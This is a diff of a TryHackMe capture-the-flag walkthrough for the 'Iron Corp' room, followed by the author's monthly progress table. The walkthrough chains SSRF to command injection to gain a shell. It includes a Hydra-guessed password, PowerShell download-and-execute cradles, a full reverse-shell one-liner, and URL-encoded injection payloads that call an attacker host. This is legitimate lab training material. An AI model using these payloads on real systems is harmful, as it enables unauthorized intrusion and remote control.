@@ -1,20 +1,22 @@
 <h1 align="center">Iron Corp</h1>
-<p align="center">2025, September 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>460</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
-<em>Can you get access to Iron Corp's system?</em>?<br>
-<img width="80px" src="https://github.com/user-attachments/assets/3ca6aff2-34c6-43ea-89e8-01a22a793524"><br>
-Access this walkthrough room clicking <a href="https://tryhackme.com/room/ironcorp">here </a>.<br>
+<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/3ca6aff2-34c6-43ea-89e8-01a22a793524"><br>
+2025, September 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
+and I’m excited to join you on this adventure, part of my <code>506</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
+<em>Can you get access to Iron Corp's system</em>?<br>
+Access it <a href=https://tryhackme.com/room/ironcorp">here</a>.<br>
 <img width="1200px" src="https://github.com/user-attachments/assets/b7cf893f-e0ad-4b8e-9f53-46b54516f860"></p>
 
-<br>
-
-<p>Practice
+<p>Practice <strong>penetration testing</strong>
   
 - <strong>Domain Enumeration</strong>: dig<br>
 - <strong>Port Scanning</strong>: nmap, rustcan<br>
 - <strong>Content Discovery</strong>: dirb<br>
-- <strong>...</strong>: Burp Suite<br>
-- <strong>Credential Harvesting</strong>: hydra<br>
-- <strong>.</strong>:..</p>
+- <strong>Password Guessing, T1110.001</strong>: hydra<br>
+- <strong>Network Sniffing, T1040</strong>: Burp Suite, FoxyProxy to intercept and inspect HTTP traffic to understand how the application behavior<br>
+- <strong>Command and Scripting Interpreter: PowerShell, - T1059.001</strong>: Burp Suite, FoxyProxy<br>
+- <strong>Exploitation for Client Execution, T1203</strong><br>
+- <strong>File and Directory Discovery, T1083</strong>: dir -force, ls -force to probe another user’s directory to enumerate contents<br>
+- <strong>Data from Local System, T1005</strong>:  accessed and exfiltrated sensitive data</p>
 
 <br>
 <br>
@@ -33,12 +35,12 @@ Happy hacking!</p>
 <p align="center"><em>Answer the questions below</em></p>
 
 <p align="center">1.1. user.txt<br>
-<code>_____</code></p>
+<code>thm{********************************}</code></p>
 
 <br>
 
 <p align="center">1.2. root.txt<br>
-<code>_____</code></p>
+<code>thm{********************************}</code></p>
 <br>
 <br>
 
@@ -346,21 +348,18 @@ PORT      STATE SERVICE       REASON  VERSION
 </h6></div><br>
 
 
-
 <p align="center"><code>ironcorp.me</code>:8080</p>
 
 <img width="1138" height="755" alt="image" src="https://github.com/user-attachments/assets/aa9eceff-830b-48e8-96a2-7fc006da2c39" />
 
 <br>
 <br>
-
 <p align="center"><code>ironcorp.me</code>:8080/tables.html</p>
 
 <img width="1134" height="653" alt="image" src="https://github.com/user-attachments/assets/754cf73c-27b0-42f7-acad-e90f282e9240" />
 
 <br>
 <br>
-
 <p align="center"><code>ironcorp.me</code>:8080/login.html</p>
 
 <img width="1136" height="568" alt="image" src="https://github.com/user-attachments/assets/df090c3c-085e-4713-af54-d4a46b7d7531" />
@@ -368,22 +367,20 @@ PORT      STATE SERVICE       REASON  VERSION
 <br>
 <br>
 
-
 <p align="center"><code>admin.ironcorp.me</code>:8080/login.html</p>
 
 <img width="1132" height="279" alt="image" src="https://github.com/user-attachments/assets/a8c1ac92-ab52-4498-b092-f07128f47b60" />
 
 <br>
 <br>
-
 <p align="center"><code>admin.ironcorp.me</code>:11025</p>
 
 <img width="1129" height="330" alt="image" src="https://github.com/user-attachments/assets/d1cb7eb3-98d1-434f-adde-ed8c6d846b73" />
 
-<br>
-<br>
 
-<h3 align="center">Hydra</h3>
+<br>
+<br>
+<h3 align="center">T1110.001 – Password Guessing</h3>
 <p align= "center">admin: password123</p>
 
 ```bash
@@ -404,25 +401,24 @@ PORT      STATE SERVICE       REASON  VERSION
 
 <h3>whoami</h3>
 
+```bash
 GET /?r=whoami HTTP/1.1
 Host: admin.ironcorp.me:11025
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
+Authorization: Basic ************************
 Connection: keep-alive
 Referer: http://admin.ironcorp.me:11025/
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
+```
 
 
-___
-
-
-
+```bash
 HTTP/1.1 200 OK
-Date: Wed, 24 Sep 2025 20:47:05 GMT
+Date: Wed, 24 Sep 2025 xx:xx:xx GMT
 Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
 X-Powered-By: PHP/7.4.4
 Content-Length: 2796
@@ -433,137 +429,7 @@ Content-Type: text/html; charset=UTF-8
 
 <html>
 <head>
-<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
-</script>
-<title>Hello</title>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<STYLE>
-body {
-	background: url(images/head.jpg);
-	background-size: 100% 700px;
-    background-repeat: no-repeat;
-font-family: Tahoma;
-color: white;
-
-}
-.side-pan {
-   margin: 0;
-   border:0px;
-   
-   width:200px;
-   padding: 5px 23px;
-   margin:0px;
-   -webkit-border-radius: 0px;
-   -moz-border-radius: 0px;
-   border-radius: 0px;
-   border-bottom: 1px solid black;
-   color: white;
-   font-size: 20px;
-   font-family: Georgia, serif;
-   text-decoration: none;
-   vertical-align: left;
-   align:left;
-   }
-   div#left {
-    width: 100%;
-    height: 50px;
-    float: left;
-	}
-div#right {
-    margin-left: 20%;
-    height: 50px;
-	color: white;
-    font-size: 20px;
-    font-family: Georgia, serif;
-	}
-.main div {
-  float: left;
-  clear: none; 
-	}
-
-input {
-border			: solid 2px ;
-border-color		: black;
-BACKGROUND-COLOR: #444444;
-font: 8pt Verdana;
-color: white;
-}
-submit {
-BORDER:  buttonhighlight 2px outset;
-BACKGROUND-COLOR: Black;
-width: 30%;
-color: #FFF;
-}
-#t input[type='submit']{
-	COLOR: White;
-	border:none;
-	BACKGROUND-COLOR: black;
-}
-#t input[type='submit']:hover {
-	
-	BACKGROUND-COLOR: #ff9933;
-	color: black;
-	
-}
-tr {
-BORDER: dashed 1px #333;
-color: #FFF;
-}
-td {
-BORDER: dashed 0px ;
-}
-.table1 {
-BORDER: 0px Black;
-BACKGROUND-COLOR: Black;
-color: #FFF;
-}
-.td1 {
-BORDER: 0px;
-BORDER-COLOR: #333333;
-font: 7pt Verdana;
-color: Green;
-}
-.tr1 {
-BORDER: 0px;
-BORDER-COLOR: #333333;
-color: #FFF;
-}
-table {
-BORDER: dashed 2px #333;
-BORDER-COLOR: #333333;
-BACKGROUND-COLOR: #191919;;
-color: #FFF;
-}
-textarea {
-border			: dashed 2px #333;
-BACKGROUND-COLOR: Black;
-font: Fixedsys bold;
-color: #999;
-}
-A:link {
-border: 1px;
-	COLOR: red; TEXT-DECORATION: none
-}
-A:visited {
-	COLOR: red; TEXT-DECORATION: none
-}
-A:hover {
-	color: White; TEXT-DECORATION: none
-}
-A:active {
-	color: white; TEXT-DECORATION: none
-}
-</STYLE>
-<script type="text/javascript">
-<!--
-    function lhook(id) {
-       var e = document.getElementById(id);
-       if(e.style.display == 'block')
-          e.style.display = 'none';
-       else
-          e.style.display = 'block';
-    }
-//-->
+...
 </script>
 
 <!DOCTYPE HTML>
@@ -590,32 +456,27 @@ A:active {
     </body>
 
 </html>
+```
 
-
-
-<h3>Search: <em>http://internal.ironcorp.me:11025</em></h3>
-
+<h3 align="center">Search: <em>internal.ironcorp.me:11025</em></h3>
 
 <img width="1128" height="222" alt="image" src="https://github.com/user-attachments/assets/a81dba2d-b3f4-457d-b3ac-9b637bbd1356" />
 
 <br>
 <br>
-
-<h3>here</h3>
+<h3 align="center">Clicked <code>Here</code></h3>
 
 <img width="1130" height="331" alt="image" src="https://github.com/user-attachments/assets/51f2ede4-13bb-4853-9912-a3091d207e06" />
 
 <br>
 <br>
-
-<h3>Webmaster</h3>
+<h3 align="center">Clicked <code>Webmaster</code></h3>
 
 <img width="683" height="237" alt="image" src="https://github.com/user-attachments/assets/c5cc46a8-9e37-40ea-ba82-ef4c2f85f89e" />
 
-
 <br>
 <br>
-<h3>Search: http://internal.ironcorp.me:11025/name.php?ls<h3>
+<h3 align="center">Search: <em>internal.ironcorp.me:11025/name.php?ls</em><h3>
 <p>
 
 - Notice:  Undefined index: name in E:\xampp\htdocs\internal\name.php on line 8<br>Equinox</p>
@@ -624,7 +485,7 @@ A:active {
 
 <br>
 <br>
-<h3>Search: http://internal.ironcorp.me:11025/name.php?name=hello</h3>
+<h3 align="center">Search: <em>internal.ironcorp.me:11025/name.php?name=hello</em></h3>
 <p>
 
 - Equinoxhello</p>
@@ -633,7 +494,7 @@ A:active {
 
 <br>
 <br>
-<h3>Search: http://internal.ironcorp.me:11025/name.php?name=hello|whoami</h3>
+<h3 align="center">Search: <em>internal.ironcorp.me:11025/name.php?name=hello|whoami</em></h3>
 <p>
 
 - nt authority\system</p>
@@ -643,7 +504,7 @@ A:active {
 <br>
 <br>
 
-<h3>Download Invoke-PowerShellTcp.ps1</h3>
+<h3 align="center">Invoke-PowerShellTcp</h3>
 <p>
 
 - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>
@@ -651,44 +512,189 @@ A:active {
 <br>
 
 
-http://internal.ironcorp.me:11025/name.php?name=
+```bash
+powershell iex (New-Object Net.WebClient).DownloadString('http://xx.xxx.xxx.xxx:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress xx.xxx.xxx.xxx -Port 9001
+```
+
+```bash
+%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38...30%25%33%31
+```
 
 
-<h3>edited adding the below, saved, set up a http server</h3>
+```bash
+http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dhello%7C%2525%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38...30%25%33%31#
+```
 
-powershell.exe -c iex(new-object net.webclient).downloadstring(‘http://10.201.118.153:9001/Invoke-PowerShellTcp.ps1')
+<img width="1118" height="462" alt="image" src="https://github.com/user-attachments/assets/0d593bd2-aee5-43b1-a898-f9375e7ba2d6" />
 
-<img width="1034" height="337" alt="image" src="https://github.com/user-attachments/assets/d9f5da9f-f8a7-43bf-abf3-3622cf114289" />
+<br>
+<br>
+
+```bash
+PS E:\xampp> cd C:\Users
+PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-----        4/11/2020   4:41 AM                Admin                         
+d-----        4/11/2020  11:07 AM                Administrator                 
+d-----        4/11/2020  11:55 AM                Equinox                       
+d-r---        4/11/2020  10:34 AM                Public                        
+d-----        4/11/2020  11:56 AM                Sunlight                      
+d-----        4/11/2020  11:53 AM                SuperAdmin                    
+d-----        4/11/2020   3:00 AM                TEMP                          
+
+
+PS C:\Users> cd Administrator
+PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-r---        4/12/2020   1:27 AM                Contacts                      
+d-r---        4/12/2020   1:27 AM                Desktop                       
+d-r---        4/12/2020   1:27 AM                Documents                     
+d-r---        4/12/2020   1:27 AM                Downloads                     
+d-r---        4/12/2020   1:27 AM                Favorites                     
+d-r---        4/12/2020   1:27 AM                Links                         
+d-r---        4/12/2020   1:27 AM                Music                         
+d-r---        4/12/2020   1:27 AM                Pictures                      
+d-r---        4/12/2020   1:27 AM                Saved Games                   
+d-r---        4/12/2020   1:27 AM                Searches                      
+d-r---        4/12/2020   1:27 AM                Videos                        
+
+
+PS C:\Users\Administrator> cd Desktop
+PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a----        3/28/2020  12:39 PM             37 user.txt                      
+
+
+PS C:\Users\Administrator\Desktop> type user.txt
+thm{********************************}
+```
 
 <br>
 <br>
 
 
-<h3>Search: http://10.201.118.153:8000/Invoke-PowerShell.ps1</h3>
+```bash
+PS C:\users\Equinox\Desktop> dir
+```
 
-:~/IronCorp# ls
-Invoke-PowerShellTcp.ps1
-root@ip-10-201-118-153:~/IronCorp# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
-
+```bash
+PS C:\users\Equinox\Desktop> dir -force
 
 
-:~/IronCorp# nc -nlvp 9001
-Listening on 0.0.0.0 9001
+    Directory: C:\users\Equinox\Desktop
+```
+
+```bash
+PS C:\users\admin> ls -force
+```
+
+```bash
+PS C:\Users\admin> dir : Access to the path 'C:\Users\admin' is denied.
+At line:1 char:1
++ dir
++ ~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\admin:String) [Get-C 
+   hildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
+   Commands.GetChildItemCommand
+```
+
+<img width="1115" height="256" alt="image" src="https://github.com/user-attachments/assets/9695c856-a3f4-45b9-b615-082e72ec2247" />
+
+<br>
+<br>
+
+<img width="1123" height="446" alt="image" src="https://github.com/user-attachments/assets/8819a5aa-3c12-4119-aaff-0fee597c0340" />
+
+<br>
+<br>
+<h1 align="center">Completed</h1>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5052af70-aec1-4e63-8455-f30d4b154462"><br><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/8f1c9b97-d5e9-425e-9414-b2ce21e9264a"></p>
 
 
+<br>
 
-powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.201.42.232/Invoke.ps1')
+<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>
 
+<div align="center"><h6>
 
-=
+| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
+|:------:|:--------------------------------------|--------:|------------:|-------------:|------------:|------------:|------------:|------------:|------------:|
+|24      |Hard 🚩 - <strong>Iron Corp</strong>   | 506    |    111ˢᵗ    |      4ᵗʰ     |     363ʳᵈ   |     5ᵗʰ     | 126,768  |   972     |   76     |    
+|23      |Medium 🔗 - Intro to Credential Harvesting|505 |     109ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     5ᵗʰ     | 126,768  |   971     |   76     |    
+|22      |                                        | 504   |              |      4ᵗʰ     |             |             |          |           |   76     |    
+|21      |                                        | 503   |              |      4ᵗʰ     |             |             |          |           |   76     |    
+|20      |                                        | 502   |              |      4ᵗʰ     |             |             |          |           |   76     |    
+|19      |                                        | 501   |              |      4ᵗʰ     |             |             |          |           |   76     |        
+|18      |Easy 🔗 - Detecting Web DDos           | 500    |     106ᵗʰ    |      4ᵗʰ     |     312ⁿᵈ   |     4ᵗʰ    | 126,674  |    970    |    76     |
+|17      |Medium 🔗 - DLL Hijacking              | 499    |     106ᵗʰ    |      4ᵗʰ     |     348ᵗʰ   |     7ᵗʰ    | 126,554  |    969    |    75     |
+|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     7ᵗʰ    | 126,546  |    968    |    75     |
+|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ   |     7ᵗʰ    | 126,538  |    967    |    74     |
+|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ   |     7ᵗʰ    | 126,420  |    966    |    74     |
+|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ   |     7ᵗʰ    | 126,420  |    965    |    74     |
+|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     7ᵗʰ    | 126,404  |    964    |    74     |
+|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ   |     6ᵗʰ    | 126,300  |    963    |    74     |
+|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ   |     6ᵗʰ    | 126,270  |    963    |    74     |
+|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ   |     6ᵗʰ    | 126,160  |    962    |    74     |
+|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ   |     6ᵗʰ    | 126,120  |    961    |    73     |
+|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     6ᵗʰ    | 126,056  |    960    |    73     |
+|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ   |     9ᵗʰ    | 125,606  |    959    |    73     |
+|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
+|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
+|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ   |     9ᵗʰ    | 125,428  |    957    |    73     |
+|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ   |     9ᵗʰ    | 125,292  |    956    |    73     |
+|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ   |     9ᵗʰ    | 125,236  |    955    |    73     |
+|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ   |    10ᵗʰ    | 125,146  |    954    |    73     |
+|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ   |    10ᵗʰ    | 125,016  |    953    |    73     |
+|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
+|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
+|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
+|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
+|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
+|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
+|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
+|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
+|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
+|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
+|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
+|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
+|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
+|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
+|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
+|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |
 
-Searh: 
-http://internal.ironcorp.me:11025/name.php?name=hello|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%34%25%33%32%25%32%65%25%33%32%25%33%33%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
+</h6></div><br>
 
+<br>
 
-http://admin.ironcorp.me:11025/?r=http%3A%2F%2F10.201.42.232%3A8000%2FInvoke.ps1#
+<p align="center">Global All Time:   106ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/82394e66-fac3-4859-a8c1-741648fb81b6"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/3ac6206c-6e40-4a38-b3e4-fd2e479b4f3e"><br><br>
+                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/342b205d-bbed-428f-b07a-1b245472ed97"><br><br>
+                  Global monthly:    312ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/e26a6034-c1b9-44ad-8326-8a0bb50b7fbd"><br><br>
+                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2bb3e977-43f8-4a15-b07f-1829025bb94b"></p>
+
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
+
 
 
 <img width="1137" height="562" alt="image" src="https://github.com/user-attachments/assets/40f38dfe-1558-4ed4-af01-a5fea68b255f" />
@@ -725,20 +731,6 @@ http://admin.ironcorp.me:11025/?r=http%3A%2F%2F10.201.42.232%3A8000%2FInvoke.ps1
 
 
 
-
-
-
-
-<p align="center"><code>ironcorp.me</code>:11025</p>
-
-<img width="1109" height="562" alt="image" src="https://github.com/user-attachments/assets/19c88c0a-91d4-4a84-88c9-ba94bf5c5813" />
-
-<br>
-<br>
-
-<p align="center">ironcorp.me:8080  |  admin.ironcorp.me:8080   |   internal.ironcorp.me:8080</p>
-
-<img width="1126" height="716" alt="image" src="https://github.com/user-attachments/assets/f85ee496-57c0-4e3e-b1d8-77c9613c3dc1" />
 
 <br>
 <br>
@@ -922,13 +914,9 @@ http://internal.ironcorp.me:11025/name.php?name=hi|powershell.exe -c iex(new-obj
 ```
 
 ```bash
-http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%64%25%36%35%25%37%38%25%36%35%25%36%33%25%32%30%25%36%32%25%37%39%25%37%30%25%36%31%25%37%33%25%37%33%25%32%30%25%32%64%25%36%33%25%32%30%25%32%32%25%32%38%25%34%65%25%36%35%25%37%37%25%32%64%25%34%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%34%65%25%36%35%25%37%34%25%32%65%25%35%37%25%36%35%25%36%32%25%34%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%35%30%25%37%32%25%36%66%25%37%38%25%37%39%25%32%65%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%37%33%25%33%64%25%35%62%25%34%65%25%36%35%25%37%34%25%32%65%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%34%33%25%36%31%25%36%33%25%36%38%25%36%35%25%35%64%25%33%61%25%33%61%25%34%34%25%36%35%25%36%36%25%36%31%25%37%35%25%36%63%25%37%34%25%34%65%25%36%35%25%37%34%25%37%37%25%36%66%25%37%32%25%36%62%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%37%33%25%33%62%25%36%39%25%37%37%25%37%32%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%39%25%33%30%25%32%65%25%33%31%25%33%35%25%33%33%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%37%63%25%36%39%25%36%35%25%37%38%25%32%32
+http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%64%25%36%35%25%37%38%25%36%35%25%36%33%25%32%30%25%36%32%25%37%39%25%37%30%25%36%31%25%37%33%25%37%33%25%32%30%25%32%64%25%36%33%25%32%30%25%32%32%25%32%38%25%34%65%25%36%35%....%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%37%63%25%36%39%25%36%35%25%37%38%25%32%32
 ```
 
-
-```bash
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-```
 
 ```bash
 http://internal.ironcorp.me:11025/name.php?name=hi|Invoke-PowerShellTcp.ps1
@@ -949,11 +937,11 @@ powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.201.28
 ```
 
 ```bash
